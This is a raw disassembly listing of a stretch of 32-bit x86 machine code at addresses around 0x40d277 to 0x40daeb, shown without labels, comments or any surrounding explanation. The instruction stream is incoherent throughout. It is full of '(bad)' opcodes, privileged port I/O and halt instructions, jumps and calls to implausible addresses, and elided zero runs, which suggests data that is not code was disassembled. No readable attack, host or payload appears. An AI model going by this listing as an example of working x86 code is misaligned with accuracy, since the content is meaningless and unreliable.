  40d277:	sbb    esp,DWORD PTR [esi-0x73]
  40d27a:	es add eax,0x91a5b4d9
  40d280:	test   al,0x1d
  40d282:	push   ss
  40d283:	inc    ecx
  40d284:	rol    DWORD PTR [esi+edi*4+0x17],0xce
  40d289:	sbb    eax,0x81d14116
  40d28e:	call   0xf65e90aa
  40d293:	or     BYTE PTR [esi-0x39],ah
  40d296:	mov    ah,0x83
  40d298:	and    al,0x44
  40d29a:	dec    eax
  40d29b:	sbb    BYTE PTR [esp+eax*2],bl
  40d29e:	jnp    0x40d22c
  40d2a0:	sbb    BYTE PTR ds:0x482c8d5c,0x57
  40d2a7:	lea    esp,[eax+ecx*2]
  40d2aa:	ficom  WORD PTR [eax+0x8978]
	...
  40d2bc:	add    dh,al
  40d2be:	inc    ecx
  40d2bf:	inc    eax
  40d2c0:	hlt    
  40d2c1:	cmp    al,0x17
  40d2c3:	jmp    0x7b98d1d8
  40d2c8:	fldenv [ebx+0x6309a005]
  40d2ce:	add    eax,0x8ac710e9
  40d2d3:	fmul   QWORD PTR [ebx]
  40d2d5:	call   0xc751afa2
  40d2da:	mov    BYTE PTR [ebx+eiz*1+0x43b416b3],ch
  40d2e1:	cld    
  40d2e2:	nop
  40d2e3:	sub    al,0x2c
  40d2e5:	test   BYTE PTR [eax+0x2e],ah
  40d2e8:	sbb    eax,0x2c2c90ec
  40d2ed:	xor    DWORD PTR [edx+0x1e],edi
  40d2f0:	sbb    eax,0x139c88df
  40d2f5:	out    0x98,al
  40d2f7:	and    BYTE PTR [ebx+0x73],bl
  40d2fa:	add    eax,0x61d003e9
  40d2ff:	ins    BYTE PTR es:[edi],dx
  40d300:	xchg   edi,eax
  40d301:	pushf  
  40d302:	pop    esp
  40d303:	add    cl,ah
  40d305:	pusha  
  40d306:	add    eax,0xab44fa00
  40d30b:	add    BYTE PTR [ebp+ebx*4+0x3e],dh
  40d30f:	push   eax
  40d310:	ror    DWORD PTR [edx-0x77],1
  40d313:	add    cl,ch
  40d315:	jmp    0x40d2a7
  40d317:	punpckldq mm5,mm5
  40d31a:	repnz rcl dh,0x63
  40d31e:	or     bh,bh
  40d320:	xor    eax,0x0
	...
  40d32d:	add    BYTE PTR [eax],al
  40d32f:	add    dh,al
  40d331:	sub    ecx,DWORD PTR [edi]
  40d333:	fs popf 
  40d335:	push   ds
  40d336:	push   eax
  40d337:	pop    ss
  40d338:	mov    ch,0x1e
  40d33a:	jnp    0x40d3b2
  40d33c:	pusha  
  40d33d:	add    eax,0xc668a783
  40d342:	or     dl,BYTE PTR [esi+0x570f28ed]
  40d348:	es pop ss
  40d34a:	add    DWORD PTR [ecx-0x2dfe71a8],0x50
  40d351:	jmp    0xe96a:0x2771d974
  40d358:	cli    
  40d359:	adc    eax,0x15fae969
  40d35e:	push   ebp
  40d35f:	pop    esi
  40d360:	cmc    
  40d361:	add    eax,0x15cae96a
  40d366:	out    0xf,eax
  40d368:	rcl    DWORD PTR ds:0x91a0f2ff,cl
  40d36e:	sub    BYTE PTR [ecx+0x53d41db0],bl
  40d374:	push   edi
  40d375:	push   ss
  40d376:	mov    edx,DWORD PTR [ecx]
  40d378:	test   eax,0x6092ffab
  40d37d:	mov    ah,0x52
  40d37f:	mov    bh,0x7f
  40d381:	nop
  40d382:	jae    0x1407ee8
  40d388:	int    0xa9
  40d38a:	(bad)  
  40d38b:	(bad)  
  40d38c:	mov    edx,0xb275c00c
  40d391:	push   esp
  40d392:	out    0x9d,eax
	...
  40d3a0:	add    BYTE PTR [eax],al
  40d3a2:	add    BYTE PTR [eax],dl
  40d3a4:	stc    
  40d3a5:	(bad)  
  40d3a6:	sub    edx,DWORD PTR [ecx-0x73]
  40d3a9:	ret    
  40d3aa:	pop    ebx
  40d3ab:	sbb    eax,0x9ac2c85b
  40d3b0:	add    DWORD PTR [ebp-0x75],edx
  40d3b3:	sahf   
  40d3b4:	jge    0x40d37a
  40d3b6:	lock push ebp
  40d3b8:	dec    esi
  40d3b9:	sub    bl,bl
  40d3bb:	popf   
  40d3bc:	jae    0x40d3c9
  40d3be:	push   DWORD PTR [edi]
  40d3c0:	or     eax,ebp
  40d3c2:	add    DWORD PTR [edi],edx
  40d3c4:	cli    
  40d3c5:	(bad)  
  40d3c6:	push   eax
  40d3c7:	mov    ebp,0x4e80773
  40d3cc:	xchg   ebx,eax
  40d3cd:	(bad)  
  40d3ce:	call   ecx
  40d3d0:	icebp  
  40d3d1:	push   edi
  40d3d2:	add    esi,edx
  40d3d4:	add    al,0xc0
  40d3d6:	je     0x40d35d
  40d3d8:	jle    0x40d41f
  40d3da:	hlt    
  40d3db:	push   0xfffffff0
  40d3dd:	je     0x40d3eb
  40d3df:	mov    ebp,0xa1e80776
  40d3e4:	out    dx,al
  40d3e5:	(bad)  
  40d3e6:	inc    ebx
  40d3e8:	inc    esi
  40d3e9:	sti    
  40d3ea:	(bad)  
  40d3eb:	idiv   eax
  40d3ed:	dec    edi
  40d3ee:	push   DWORD PTR [edi]
  40d3f0:	or     eax,0xe10275ff
  40d3f5:	cwde   
  40d3f6:	std    
  40d3f7:	popf   
  40d3f8:	lock mov BYTE PTR [ebp-0x5e],al
  40d3fc:	lock je 0x40d3ef
  40d3ff:	cmp    eax,0xb7fff776
  40d404:	add    al,0xff
  40d406:	jne    0x40d408
	...
  40d414:	add    BYTE PTR [eax],al
  40d416:	ds loope 0x40d429
  40d419:	(bad)  
  40d41a:	cmp    eax,0x7dd88af0
  40d41f:	jbe    0x40d41c
  40d421:	call   0xffbe1e89
  40d426:	int3   
  40d427:	add    edx,DWORD PTR [ecx+0x7d42bbf7]
  40d42d:	(bad)  
  40d42e:	mov    esp,0xb4570378
  40d433:	xchg   ecx,eax
  40d434:	or     ch,al
  40d436:	sti    
  40d437:	lods   eax,DWORD PTR ds:[esi]
  40d438:	sbb    bh,bh
  40d43a:	fcomp  DWORD PTR [edi-0x42]
  40d43d:	pop    esi
  40d43e:	stos   BYTE PTR es:[edi],al
  40d43f:	pusha  
  40d440:	or     eax,DWORD PTR [eax]
  40d442:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40d444:	or     DWORD PTR es:[esi],0x32
  40d448:	add    DWORD PTR [edx+0x42],esi
  40d44b:	dec    ebx
  40d44c:	nop
  40d44d:	(bad)  
  40d44f:	(bad)  [ebx]
  40d451:	call   0xff5a8738
  40d456:	ins    BYTE PTR es:[edi],dx
  40d457:	fpatan 
  40d459:	(bad)  
  40d45a:	out    dx,al
  40d45b:	adc    eax,0x735eaf2b
  40d460:	sbb    bh,bh
  40d462:	into   
  40d463:	push   cs
  40d464:	sbb    dh,BYTE PTR [ebp+0x5b]
  40d467:	xchg   BYTE PTR [edi-0x3],bl
  40d46a:	inc    esp
  40d46b:	mov    ebx,DWORD PTR [edx]
  40d46d:	jne    0x40d4c2
  40d46f:	xchg   ebx,eax
  40d470:	pop    DWORD PTR [edi]
  40d472:	dec    ebx
  40d473:	call   0xa76dd392
  40d478:	scas   eax,DWORD PTR es:[edi]
  40d479:	adc    eax,DWORD PTR [eax]
	...
  40d487:	add    BYTE PTR [eax],al
  40d489:	ficomp DWORD PTR [edi]
  40d48b:	sbb    dh,BYTE PTR [ebp+0x73]
  40d48e:	mov    bl,0x8f
  40d490:	pop    es
  40d491:	or     esp,DWORD PTR [ebp-0x60f300e9]
  40d497:	xchg   edi,eax
  40d498:	or     esp,DWORD PTR [eax+0x54]
  40d49b:	icebp  
  40d49c:	(bad)  
  40d49d:	jbe    0x40d4cd
  40d49f:	sbb    dh,BYTE PTR [ebp+0x6b]
  40d4a2:	(bad)  
  40d4a3:	call   0x5375:0x19e2ecfc
  40d4aa:	add    eax,0x1d649026
  40d4af:	mov    WORD PTR [eax],ds
  40d4b1:	aam    0x13
  40d4b3:	push   ss
  40d4b4:	nop
  40d4b5:	pop    esp
  40d4b6:	lahf   
  40d4b7:	lock sbb cl,BYTE PTR [esi-0x3]
  40d4bb:	adc    BYTE PTR [esi-0x29],ch
  40d4be:	adc    edi,esi
  40d4c0:	sbb    DWORD PTR [esi],ebp
  40d4c2:	cmc    
  40d4c3:	cmc    
  40d4c4:	(bad)  
  40d4c5:	fs sbb eax,0x13a46fcd
  40d4cb:	mov    al,0x46
  40d4cd:	jae    0x40d4d4
  40d4cf:	xor    al,0x8d
  40d4d1:	xchg   DWORD PTR [ebx],edx
  40d4d3:	pop    esp
  40d4d4:	or     cl,bh
  40d4d6:	add    eax,0x1d5c8fce
  40d4db:	jne    0x40d54d
  40d4dd:	jl     0x40d4f2
  40d4df:	mov    esi,0x3c14688f
  40d4e4:	or     al,0x7b
  40d4e6:	sub    ebp,DWORD PTR [edi+0x3c7f6419]
  40d4ec:	hlt    
	...
  40d4f9:	add    BYTE PTR [eax],al
  40d4fb:	add    bl,ch
  40d4fd:	pop    es
  40d4fe:	sahf   
  40d4ff:	(bad)
  40d503:	or     al,0x3b
  40d505:	cmp    ecx,DWORD PTR [edi+0x1c7f4419]
  40d50b:	lock jmp 0x40d515
  40d50e:	jle    0x40d49f
  40d510:	push   0x3b0bfc12
  40d515:	dec    ebx
  40d516:	outs   dx,DWORD PTR ds:[esi]
  40d517:	sbb    DWORD PTR [edi+edi*2],esp
  40d51a:	mov    esp,0x3007ebfb
  40d51f:	inc    esi
  40d520:	outs   dx,DWORD PTR ds:[esi]
  40d521:	add    eax,0x86ff8cbc
  40d526:	and    eax,0x45baad28
  40d52b:	(bad)  
  40d52c:	push   eax
  40d52d:	lahf   
  40d52e:	out    0x18,eax
  40d530:	outs   dx,BYTE PTR ds:[esi]
  40d531:	std    
  40d532:	inc    DWORD PTR [eax+0x26]
  40d535:	ja     0x40d536
  40d537:	cs dec edx
  40d539:	cwde   
  40d53a:	adc    esp,DWORD PTR [esi]
  40d53c:	in     al,dx
  40d53d:	or     ch,al
  40d53f:	push   ebp
  40d540:	dec    esi
  40d541:	adc    bh,bh
  40d543:	bound  esi,QWORD PTR [edi+0x1c]
  40d546:	cmp    ebp,eax
  40d548:	pusha  
  40d549:	add    eax,0x87ccac8b
  40d54e:	cmp    cl,ch
  40d550:	in     eax,0x9
  40d552:	jmp    0x463716
  40d557:	es in  al,0xe
  40d55a:	add    cl,ch
  40d55c:	pusha  
  40d55d:	add    eax,0x248d
	...
  40d56e:	add    BYTE PTR [ebx-0x4b],bh
  40d571:	(bad)  
  40d572:	pop    esp
  40d573:	xchg   ebx,eax
  40d574:	adc    esi,DWORD PTR [ebp-0x7]
  40d577:	imul   ebx,DWORD PTR [eax+0x1356d107],0xffffffff
  40d57e:	mov    esi,0x34830de7
  40d583:	dec    ebx
  40d584:	add    eax,0x11b70a74
  40d589:	cmp    ebp,DWORD PTR [eax]
  40d58b:	adc    dh,BYTE PTR [di-0x63]
  40d58f:	mov    BYTE PTR [edi+0x6b],bh
  40d592:	jmp    0x1500d3f7
  40d597:	pop    esp
  40d598:	popf   
  40d599:	add    al,0xc5
  40d59b:	and    DWORD PTR [edx],edx
  40d59d:	(bad)  
  40d59e:	hlt    
  40d59f:	dec    esp
  40d5a0:	sbb    eax,0x5670279
  40d5a5:	mov    DWORD PTR [ebx+edi*2],esp
  40d5a8:	push   ds
  40d5a9:	pop    es
  40d5aa:	fstp   QWORD PTR cs:0x560e900
  40d5b1:	adc    esp,0x44
  40d5b4:	add    eax,0x4b8f174
  40d5b9:	add    BYTE PTR [eax],al
  40d5bb:	xchg   ebp,eax
  40d5bc:	lods   al,BYTE PTR ds:[esi]
  40d5bd:	(bad)  
  40d5be:	jne    0x40d5c6
  40d5c0:	fiadd  WORD PTR [esi-0x6b]
  40d5c3:	xor    eax,0x3675feed
  40d5c8:	in     eax,dx
  40d5c9:	je     0x40d5d7
  40d5cb:	jb     0x40d559
  40d5cd:	xchg   esp,eax
  40d5ce:	push   DWORD PTR [ebp-0x21]
  40d5d1:	mov    al,BYTE PTR [eax]
	...
  40d5df:	add    BYTE PTR [eax],al
  40d5e1:	add    BYTE PTR [edx-0x31ba74fb],bh
  40d5e7:	mov    BYTE PTR [eax],bh
  40d5e9:	add    BYTE PTR [edi],bh
  40d5eb:	adc    ebp,eax
  40d5ed:	xchg   dl,cl
  40d5ef:	add    eax,0xedffc700
  40d5f4:	(bad)  
  40d5f5:	(bad)  
  40d5f6:	mov    edx,0xbe45c705
  40d5fb:	or     BYTE PTR [eax],al
  40d5fd:	add    BYTE PTR [edx+0x7af044d2],cl
  40d603:	add    eax,0x44270000
  40d608:	out    dx,eax
  40d609:	push   eax
  40d60a:	test   DWORD PTR [ebx-0xd],0xf7440750
  40d611:	push   eax
  40d612:	mov    ch,0x73
  40d614:	adc    edi,edi
  40d616:	das    
  40d617:	add    eax,ebp
  40d619:	loope  0x40d61f
  40d61b:	stc    
  40d61c:	inc    BYTE PTR [ebx+0x73ffdd77]
  40d622:	sub    DWORD PTR [ebp+edi*2+0x2c813af8],eax
  40d629:	and    DWORD PTR [edi-0xb],0xffffffff
  40d62d:	je     0x40d66b
  40d62f:	test   BYTE PTR [ebp-0x10],bh
  40d632:	cmp    al,BYTE PTR [ecx-0x12d000e0]
  40d638:	(bad)  
  40d639:	jne    0x40d651
  40d63b:	fnstsw WORD PTR [edx*4+0x75fef8b5]
  40d642:	arpl   WORD PTR [edx+0x7516],si
	...
  40d654:	add    BYTE PTR [edi-0x3a],dl
  40d657:	rcl    DWORD PTR [esp+edi*8-0xc8ae939],1
  40d65e:	iret   
  40d65f:	nop
  40d660:	or     edi,ebx
  40d662:	push   DWORD PTR [eax-0x1]
  40d665:	in     al,0xdf
  40d667:	nop
  40d668:	test   ebx,0xd4ff7b32
  40d66e:	out    dx,eax
  40d66f:	nop
  40d670:	repz mov ebx,0xc4ff7b4a
  40d676:	call   DWORD PTR [eax+0x7b42cbef]
  40d67c:	push   DWORD PTR [edi+ebx*2-0x5ea300f6]
  40d683:	test   al,0xfe
  40d685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d686:	pop    ds
  40d687:	cmp    BYTE PTR [ebp-0x71],0x1e
  40d68b:	(bad)  
  40d68c:	sbb    eax,0x75161e09
  40d691:	pop    edi
  40d692:	inc    esi
  40d693:	outs   dx,DWORD PTR ds:[esi]
  40d694:	xchg   esp,eax
  40d695:	test   BYTE PTR [edi],bh
  40d697:	test   eax,0x7d17dff
  40d69c:	call   0xff56918a
  40d6a1:	stc    
  40d6a2:	sbb    eax,0x46577516
  40d6a7:	adc    DWORD PTR [esp+ebx*2+0x57751667],0x76
  40d6af:	es xchg edi,eax
  40d6b1:	dec    esp
  40d6b2:	ja     0x40d679
  40d6b4:	or     cl,BYTE PTR [ebp+0x2f]
  40d6b7:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  40d6c6:	add    BYTE PTR [eax],al
  40d6c8:	cmp    eax,0x955f1687
  40d6cd:	push   ebp
  40d6ce:	inc    ecx
  40d6cf:	adc    BYTE PTR [ebx-0xf],ah
  40d6d2:	mov    ch,ah
  40d6d4:	loopne 0x40d73f
  40d6d6:	pop    ds
  40d6d7:	push   esi
  40d6d8:	sbb    al,0x5
  40d6da:	fmul   QWORD PTR [ebx]
  40d6dc:	or     edi,DWORD PTR [eax+0x6e]
  40d6df:	push   ss
  40d6e0:	or     al,0x7e
  40d6e2:	lods   al,BYTE PTR ds:[esi]
  40d6e3:	pavgb  mm2,QWORD PTR [ecx-0x48e0cac]
  40d6ea:	add    BYTE PTR [ebx+eiz*2],0x5
  40d6ee:	jmp    0xe183f2a8
  40d6f3:	add    esp,esp
  40d6f5:	cdq    
  40d6f6:	loopne 0x40d723
  40d6f8:	(bad)  
  40d6f9:	jne    0x40d721
  40d6fb:	push   ss
  40d6fc:	pushf  
  40d6fd:	leave  
  40d6fe:	and    BYTE PTR [ebx+eiz*2],al
  40d701:	add    eax,0xd1e88e9
  40d706:	mov    ecx,0x10fd3616
  40d70b:	(bad)  
  40d70d:	paddd  mm1,QWORD PTR [ebx-0x6795eeda]
  40d714:	lods   al,BYTE PTR ds:[esi]
  40d715:	add    al,0x75
  40d717:	pop    es
  40d718:	loopne 0x40d6ab
  40d71a:	in     al,0x2
  40d71c:	adc    DWORD PTR [edi],eax
  40d71e:	push   0xffffff97
  40d720:	mov    BYTE PTR [esi],al
  40d722:	pop    edi
  40d723:	or     cl,bl
  40d725:	add    eax,0xaf6303e9
  40d72a:	scas   eax,DWORD PTR es:[edi]
  40d72b:	inc    edx
	...
  40d738:	add    BYTE PTR [eax],al
  40d73a:	add    BYTE PTR [ebx+0x5],ch
  40d73d:	ins    BYTE PTR es:[edi],dx
  40d73e:	mov    edi,0x8fb5b474
  40d743:	pop    esp
  40d744:	sbb    eax,0xf5c73ad
  40d749:	push   0xffffff97
  40d74b:	dec    esp
  40d74c:	push   es
  40d74d:	adc    eax,0x1d455800
  40d752:	or     cl,BYTE PTR [ebx]
  40d754:	add    eax,0xaf6303e9
  40d759:	scas   eax,DWORD PTR es:[edi]
  40d75a:	inc    edx
  40d75b:	imul   eax,DWORD PTR ds:0x928976a,0x0
  40d762:	sti    
  40d763:	das    
  40d764:	add    BYTE PTR [ebp+0x71],0xd7
  40d768:	pushf  
  40d769:	pop    ss
  40d76a:	data16 in al,0x6
  40d76d:	call   0xff4f6a33
  40d772:	les    edx,FWORD PTR fs:[esi]
  40d775:	push   eax
  40d776:	dec    esi
  40d777:	in     al,dx
  40d778:	push   es
  40d779:	call   0xff4f47af
  40d77e:	jo     0x40d72c
  40d780:	and    ch,bl
  40d782:	aam    0xdd
  40d784:	enter  0x99f7,0x77
  40d788:	cwde   
  40d789:	pop    es
  40d78a:	adc    DWORD PTR [esi],esp
  40d78c:	je     0x40d78d
  40d78e:	push   ds
  40d78f:	fmul   st,st(0)
  40d791:	jecxz  0x40d7f7
  40d793:	add    al,0x17
  40d795:	push   eax
  40d796:	cmp    DWORD PTR [edi+ecx*1-0x24770e8b],0xffffff91
  40d79e:	inc    BYTE PTR [eax]
	...
  40d7ac:	add    BYTE PTR [eax],al
  40d7ae:	push   edi
  40d7af:	add    BYTE PTR [ebp-0xf],0xf0
  40d7b3:	pcmpeqw mm4,mm1
  40d7b6:	dec    eax
  40d7b7:	xor    bh,dl
  40d7b9:	out    0x6f,al
  40d7bb:	cmp    BYTE PTR [ebp-0x3b],0x61
  40d7bf:	cwde   
  40d7c0:	sbb    eax,0x5016c564
  40d7c5:	into   
  40d7c6:	in     eax,dx
  40d7c7:	or     bh,bh
  40d7c9:	cmp    al,0x6b
  40d7cb:	push   cs
  40d7cc:	jne    0x40d7bf
  40d7ce:	cmp    BYTE PTR [edi-0x3],bl
  40d7d1:	mov    dh,0x4f
  40d7d3:	add    BYTE PTR [ebp-0x4f],0x10
  40d7d7:	pcmpeqw mm6,mm1
  40d7da:	mov    BYTE PTR [esi-0x6],bl
  40d7dd:	sahf   
  40d7de:	ja     0x40d762
  40d7e0:	jge    0x40d773
  40d7e2:	pusha  
  40d7e3:	cwde   
  40d7e4:	or     DWORD PTR [ecx+0x60],edx
  40d7e7:	add    eax,0x584a0000
  40d7ec:	enter  0x32c2,0x2
  40d7f0:	lea    eax,[ebp-0x4e]
  40d7f3:	push   edx
  40d7f4:	(bad)  
  40d7f5:	jne    0x40d785
  40d7f7:	stc    
  40d7f8:	je     0x40d806
  40d7fa:	jge    0x40d87b
  40d7fc:	pop    es
  40d7fd:	call   0x3fcf7c
  40d802:	jns    0x40d87b
  40d804:	test   DWORD PTR [eax],0xb7fc17
  40d80a:	or     al,BYTE PTR [edx]
  40d80c:	add    BYTE PTR [esi+0x33],bl
  40d80f:	les    eax,FWORD PTR [edi]
	...
  40d821:	jg     0x40d872
  40d823:	not    DWORD PTR [eax-0x73]
  40d826:	jg     0x40d82f
  40d828:	call   0x3f6aef
  40d82d:	push   ecx
  40d82e:	bnd call 0x42932f
  40d834:	call   edi
  40d836:	stc    
  40d837:	out    0xe7,eax
  40d839:	sbb    cl,bh
  40d83b:	(bad)  
  40d83c:	cmp    eax,DWORD PTR [edi]
  40d83e:	(bad)  
  40d83f:	je     0x40d846
  40d841:	arpl   WORD PTR [ecx],ax
  40d843:	add    BYTE PTR [eax],al
  40d845:	mov    al,BYTE PTR [ebp+edi*2+0x237784fc]
  40d84c:	lea    eax,[edi+0x1]
  40d84f:	push   eax
  40d850:	jmp    DWORD PTR [edi]
  40d852:	adc    edi,esp
  40d854:	or     eax,0x8dfef1fb
  40d859:	inc    edi
  40d85a:	add    DWORD PTR [eax-0x1],edx
  40d85d:	aaa    
  40d85e:	adc    edi,esp
  40d860:	cmp    dh,BYTE PTR [eax-0x7872010f]
  40d866:	stc    
  40d867:	dec    edi
  40d868:	push   DWORD PTR [edi+0x9]
  40d86b:	out    0x2e,eax
  40d86d:	add    cl,bh
  40d86f:	dec    BYTE PTR [ebp+0x500bd963]
  40d875:	cmp    al,0xf2
  40d877:	sti    
  40d878:	out    0x10,eax
  40d87a:	mov    BYTE PTR [ebx],dl
  40d87c:	(bad)  
  40d87d:	(bad)  
  40d87f:	adc    ecx,DWORD PTR [ebp-0x14c6962]
	...
  40d891:	add    BYTE PTR [eax],al
  40d893:	add    BYTE PTR [esi+0x18c41b26],dl
  40d899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d89a:	adc    cl,BYTE PTR [ecx+0x4580baa6]
  40d8a0:	or     ecx,DWORD PTR [edi+0x12]
  40d8a3:	jne    0x40d910
  40d8a5:	(bad)  
  40d8a6:	pop    eax
  40d8a7:	sti    
  40d8a8:	hlt    
  40d8a9:	ret    
  40d8aa:	jl     0x40d8f1
  40d8ac:	sti    
  40d8ad:	lahf   
  40d8ae:	nop
  40d8af:	out    dx,eax
  40d8b0:	arpl   WORD PTR [edx-0x6a],cx
  40d8b3:	sbb    BYTE PTR [esi-0x36],0x3
  40d8b7:	je     0x40d8ff
  40d8b9:	lahf   
  40d8ba:	nop
  40d8bb:	out    0x63,eax
  40d8bd:	jb     0x40d869
  40d8bf:	add    BYTE PTR [esi-0xa],0x3
  40d8c3:	je     0x40d907
  40d8c5:	xchg   BYTE PTR [ecx],al
  40d8c7:	cmp    al,0x22
  40d8c9:	push   ds
  40d8ca:	adc    dh,BYTE PTR [ebp-0x4d]
  40d8cd:	test   BYTE PTR [esi+0x68],0x63
  40d8d1:	push   ds
  40d8d2:	(bad)  
  40d8d3:	mov    edi,0xfc9b3c16
  40d8d8:	pop    eax
  40d8d9:	fld    QWORD PTR [ebx]
  40d8db:	call   DWORD PTR [esi]
  40d8dd:	sbb    ebp,DWORD PTR cs:[edx+0xb031dfb]
  40d8e4:	mov    ds:0x5e6800b1,eax
  40d8e9:	add    al,ch
  40d8eb:	jmp    FWORD PTR [ebp-0x2f]
  40d8ee:	adc    ebp,eax
  40d8f0:	retf   0x3c6
  40d8f3:	add    BYTE PTR [eax+0x5e],ch
  40d8f6:	xchg   edi,eax
  40d8f7:	sub    eax,0x0
	...
  40d904:	add    BYTE PTR [eax],al
  40d906:	add    bl,cl
  40d908:	add    eax,0x4b3c03e9
  40d90d:	sahf   
  40d90e:	cwde   
  40d90f:	pop    eax
  40d910:	sbb    eax,0xc3c761c
  40d915:	mov    ds,WORD PTR [eax-0x3f3bc]
  40d91b:	inc    esp
  40d91c:	cmp    DWORD PTR [ebx+0x12],ebx
  40d91f:	and    al,0xc
  40d921:	cld    
  40d922:	pop    ds
  40d923:	sbb    al,0x92
  40d925:	fcomp  QWORD PTR [ebx]
  40d927:	and    dh,BYTE PTR [edi+0x66]
  40d92a:	adc    cl,BYTE PTR [edx+edx*4]
  40d92d:	push   eax
  40d92e:	adc    cl,BYTE PTR [esi-0x2ea6bf07]
  40d934:	or     ecx,DWORD PTR [esi+0x12]
  40d937:	outs   dx,BYTE PTR ds:[esi]
  40d938:	adc    eax,0xbd64651
  40d93d:	adc    ch,BYTE PTR ds:[esi+0x19]
  40d941:	inc    ecx
  40d942:	dec    esi
  40d943:	test   BYTE PTR [ebx],0x2e
  40d946:	adc    cl,BYTE PTR [esi+0x1d]
  40d949:	adc    DWORD PTR [esi-0xa],edx
  40d94c:	or     ebx,DWORD PTR [esi]
  40d94e:	shl    ecx,0x89
  40d951:	adc    BYTE PTR [ebx],al
  40d953:	aaa    
  40d954:	std    
  40d955:	loope  0x40d970
  40d957:	fs cmp dh,0x10
  40d95b:	lods   al,BYTE PTR ds:[esi]
  40d95c:	or     esi,DWORD PTR [edx-0x38]
  40d95f:	lods   al,BYTE PTR ds:[esi]
  40d960:	stos   BYTE PTR es:[edi],al
  40d961:	pop    ds
  40d962:	inc    ebp
  40d963:	imul   eax,DWORD PTR ds:0x87877e94,0xffffffad
  40d96a:	adc    BYTE PTR [eax],al
	...
  40d978:	add    BYTE PTR [eax],al
  40d97a:	mov    WORD PTR [ecx+0x4d181bec],ss
  40d980:	(bad)  
  40d981:	adc    DWORD PTR [eax+0x45],ebp
  40d984:	push   esp
  40d985:	shl    edi,1
  40d987:	rol    esp,0xb4
  40d98a:	test   BYTE PTR ds:0xb64116d,dh
  40d990:	add    BYTE PTR [ebx+esi*2],bh
  40d993:	or     dh,BYTE PTR [ebp-0x23]
  40d996:	js     0x40d9ea
  40d998:	mov    fs,WORD PTR [esi+0x15bffe72]
  40d99e:	push   edx
  40d99f:	or     al,0x75
  40d9a1:	loope  0x40d9f6
  40d9a3:	nop
  40d9a4:	sti    
  40d9a5:	sub    edx,0x2e86ff08
  40d9ab:	dec    ebx
  40d9ac:	jne    0x40d987
  40d9ae:	enter  0xf0a,0x86
  40d9b2:	mov    cl,0xa
  40d9b4:	jne    0x40d993
  40d9b6:	jae    0x40d948
  40d9b8:	pop    es
  40d9b9:	push   ecx
  40d9ba:	adc    DWORD PTR [edx-0x1],0xfb90725e
  40d9c1:	inc    ecx
  40d9c2:	scas   eax,DWORD PTR es:[edi]
  40d9c3:	jns    0x40d9c4
  40d9c5:	dec    esi
  40d9c6:	cmp    BYTE PTR [edi+0x8],al
  40d9c9:	jmp    0x692d5983
  40d9ce:	fwait
  40d9cf:	push   ecx
  40d9d0:	(bad)  
  40d9d1:	ss jb  0x40da16
  40d9d4:	test   DWORD PTR [ecx+0x71],esi
  40d9d7:	or     bh,bh
  40d9d9:	jmp    0x7240df3e
	...
  40d9ea:	add    BYTE PTR [eax],al
  40d9ec:	add    BYTE PTR [esi+edi*8+0x1db290a],bl
  40d9f3:	adc    cl,0x60
  40d9f6:	nop
  40d9f7:	add    al,0x10
  40d9f9:	lock add eax,0x9053e900
  40d9ff:	or     eax,DWORD PTR [ecx]
  40da01:	arpl   WORD PTR [ebp-0x1],sp
  40da04:	out    dx,al
  40da05:	xchg   edi,eax
  40da06:	dec    edx
  40da07:	jne    0x40d9ff
  40da09:	call   0x5f69068b
  40da0e:	or     dh,BYTE PTR [ebp-0x1b]
  40da11:	pop    eax
  40da12:	pop    esp
  40da13:	cwde   
  40da14:	into   
  40da15:	push   ebx
  40da16:	push   ds
  40da17:	or     eax,0x2c871200
  40da1c:	inc    ecx
  40da1d:	jp     0x40da14
  40da1f:	je     0x40da2d
  40da21:	and    bl,BYTE PTR [eax-0x70fa0069]
  40da27:	test   BYTE PTR [eax+0x68fef504],bh
  40da2d:	and    al,0x7
  40da2f:	add    BYTE PTR [eax],al
  40da31:	mov    DWORD PTR [ebx-0xb1a013e],0x9308e84f
  40da3b:	(bad)  
  40da3c:	push   DWORD PTR [edi-0x6a013d7d]
  40da42:	cmc    
  40da43:	dec    edi
  40da44:	dec    DWORD PTR [edi-0x42]
  40da47:	std    
  40da48:	inc    DWORD PTR [ebp-0x599b212]
  40da4e:	add    eax,0x8589
	...
  40da5f:	add    dh,dl
  40da61:	repz (bad) 
  40da63:	dec    edx
  40da65:	add    al,0x84
  40da67:	repz cli 
  40da69:	add    eax,0xc08f8d00
  40da6e:	std    
  40da6f:	call   DWORD PTR [ebp-0x35effe13]
  40da75:	add    eax,0x8b077400
  40da7a:	inc    ecx
  40da7b:	sub    al,0xa
  40da7d:	outs   dx,BYTE PTR ds:[esi]
  40da7e:	sub    DWORD PTR [ebx+ecx*1],0x6
  40da82:	call   0x46b6b2
  40da87:	or     edi,DWORD PTR [edx+0x73]
  40da8a:	add    al,0xe9
  40da8c:	adc    eax,DWORD PTR [esi]
  40da8e:	add    BYTE PTR [eax],al
  40da90:	pop    es
  40da91:	xchg   ebx,eax
  40da92:	sar    esi,0x85
  40da95:	stc    
  40da96:	mov    WORD PTR [edx+0x76],es
  40da99:	push   ecx
  40da9a:	xchg   BYTE PTR [bp+0x40],dl
  40da9e:	jmp    edi
  40daa0:	arpl   WORD PTR [edx],sp
  40daa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa3:	push   DWORD PTR [esi+eiz*1+0x43]
  40daa7:	jne    0x40db0f
  40daa9:	xor    eax,0x1c630080
  40daae:	push   cs
  40daaf:	jne    0x40db20
  40dab1:	inc    esi
  40dab2:	mov    al,ds:0xfb58549e
  40dab7:	mov    edi,0x979b0fd6
  40dabc:	jnp    0x40da9b
  40dabe:	add    edi,edi
  40dac0:	mov    dh,0x22
  40dac2:	sbb    ecx,DWORD PTR [ecx]
	...
  40dad0:	add    BYTE PTR [eax],al
  40dad2:	add    bl,bl
  40dad4:	ja     0x40dae5
  40dad6:	jmp    0x40db31
  40dad8:	hlt    
  40dad9:	add    edi,edi
  40dadb:	scas   al,BYTE PTR es:[edi]
  40dadc:	sbb    bl,BYTE PTR [ebx]
  40dade:	std    
  40dadf:	hlt    
  40dae0:	(bad)  
  40dae1:	push   cs
  40dae2:	(bad)  
  40dae3:	out    dx,al
  40dae4:	pop    esp
  40dae5:	push   cs
  40dae6:	dec    DWORD PTR [edx+edx*4]
  40dae9:	mov    cl,0x2b
  40daeb:	mov    cl,0x4e
